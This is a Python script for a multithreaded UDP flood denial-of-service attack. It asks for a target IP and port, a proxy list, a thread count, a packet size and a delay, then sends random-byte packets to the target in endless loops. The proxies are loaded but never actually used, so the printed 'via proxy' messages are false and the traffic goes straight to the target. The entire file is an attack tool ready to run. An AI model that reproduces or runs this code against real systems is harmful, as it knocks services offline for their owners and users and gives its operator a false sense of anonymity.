import socket
import threading
import random
import time

def attack(target_ip, target_port, proxy, packet_size, delay):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    
    
    proxy_ip, proxy_port = proxy.split(':')
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    while True:
        try:
            bytes = random._urandom(packet_size)  
            sock.sendto(bytes, (target_ip, target_port))
            print(f'Sent packet to {target_ip}:{target_port} via proxy {proxy}')
            time.sleep(delay) 
        except Exception as e:
            print(f'Error: {e}')


def load_proxies(filename):
    with open(filename, 'r') as file:
        proxies = [line.strip() for line in file.readlines()]
    return proxies

# Main function
def main():
    target_ip = input("Target IP: ") 
    target_port = int(input("Target Port: ")) 
    proxy_file = input("Proxy: ") 

    proxies = load_proxies(proxy_file)

    num_threads = int(input("Thread: "))
    packet_size = int(input("Packet Send (default 1024): ") or 1024)
    delay = float(input("Delay Per Seconds (default 0.1): ") or 0.1)
    
    for i in range(num_threads):
        proxy = random.choice(proxies) 
        thread = threading.Thread(target=attack, args=(target_ip, target_port, proxy, packet_size, delay))
        thread.start()

if __name__ == "__main__":
    main()
